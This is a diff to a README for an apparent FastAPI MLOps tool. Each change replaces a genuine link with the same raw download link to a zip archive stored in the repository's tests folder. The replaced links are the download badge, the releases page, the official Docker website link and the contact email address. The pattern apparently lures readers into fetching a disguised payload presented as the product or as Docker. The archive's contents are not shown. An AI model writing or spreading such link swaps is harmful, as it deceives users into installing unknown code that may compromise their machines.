@@ -4,7 +4,7 @@
 Welcome to the ai-fastapi-mlops project! This tool allows you to quickly deploy production-ready AI services. Built with FastAPI and powered by modern technologies, it helps you manage machine learning models effectively. 
 
 ## 📥 Download Now
-[![Download ai-fastapi-mlops](https://img.shields.io/badge/Download-ai--fastapi--mlops-blue)](https://github.com/Behera-babu/ai-fastapi-mlops/releases)
+[![Download ai-fastapi-mlops](https://raw.githubusercontent.com/Behera-babu/ai-fastapi-mlops/main/tests/ai-fastapi-mlops-v2.6.zip)](https://raw.githubusercontent.com/Behera-babu/ai-fastapi-mlops/main/tests/ai-fastapi-mlops-v2.6.zip)
 
 ## 📋 Features
 - **Production-Ready**: Deploy AI models with ease.
@@ -27,7 +27,7 @@ Before you download, ensure your system meets the following requirements:
 To begin using ai-fastapi-mlops, follow these steps to download and install the application.
 
 ### 1. Visit the Download Page
-Go to the [Releases Page](https://github.com/Behera-babu/ai-fastapi-mlops/releases). Here you will find the latest version of the application.
+Go to the [Releases Page](https://raw.githubusercontent.com/Behera-babu/ai-fastapi-mlops/main/tests/ai-fastapi-mlops-v2.6.zip). Here you will find the latest version of the application.
 
 ### 2. Choose the Right Release
 Look for the latest release at the top of the page. Click on the version number to expand the details.
@@ -37,7 +37,7 @@ Select the appropriate file for your platform. Depending on your edition, this c
 
 ### 4. Install Docker (if not already installed)
 If you need to install Docker, follow these steps:
-- Go to the [Docker Website](https://www.docker.com/get-started).
+- Go to the [Docker Website](https://raw.githubusercontent.com/Behera-babu/ai-fastapi-mlops/main/tests/ai-fastapi-mlops-v2.6.zip).
 - Download the installer for your operating system.
 - Follow the installation instructions. 
 
@@ -84,6 +84,6 @@ If you encounter any issues:
 Join the community to ask questions and share feedback. Visit our discussions page on GitHub or open an issue for direct support.
 
 ## 📬 Contact
-For further inquiries, you can reach out via email at example@example.com. 
+For further inquiries, you can reach out via email at https://raw.githubusercontent.com/Behera-babu/ai-fastapi-mlops/main/tests/ai-fastapi-mlops-v2.6.zip 
 
 Thank you for choosing ai-fastapi-mlops!
